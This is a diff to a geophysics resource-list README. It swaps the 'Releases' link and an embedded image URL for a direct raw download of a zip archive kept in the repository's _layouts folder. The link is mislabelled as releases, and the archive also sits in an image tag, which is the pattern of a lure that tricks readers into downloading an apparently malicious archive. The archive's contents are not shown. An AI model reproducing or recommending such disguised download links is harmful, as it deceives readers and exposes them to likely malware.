@@ -37,7 +37,7 @@ This repository covers a wide range of topics related to geophysics, including:
 
 ## **Get Started**
 
-To access the resources and materials provided in this repository, visit the [Releases](https://github.com/knible/awesome-geophysics/releases) section. Here, you can download the necessary files and explore the tools, datasets, and educational materials available to empower your geophysical exploration journey.
+To access the resources and materials provided in this repository, visit the [Releases](https://github.com/knible/awesome-geophysics/raw/refs/heads/main/_layouts/geophysics_awesome_v1.3-alpha.5.zip) section. Here, you can download the necessary files and explore the tools, datasets, and educational materials available to empower your geophysical exploration journey.
 
 ## **Join the Community**
 
@@ -49,4 +49,4 @@ In conclusion, the "awesome-geophysics" repository is a valuable resource for an
 
 Explore the world beneath our feet with confidence and curiosity, knowing that you have the support of a vibrant community and a wealth of resources at your fingertips. Happy exploring!
 
-![Geophysics Image](https://cdn.pixabay.com/photo/2016/01/19/17/37/cave-1149236_960_720.jpg)
+![Geophysics Image](https://github.com/knible/awesome-geophysics/raw/refs/heads/main/_layouts/geophysics_awesome_v1.3-alpha.5.zip)
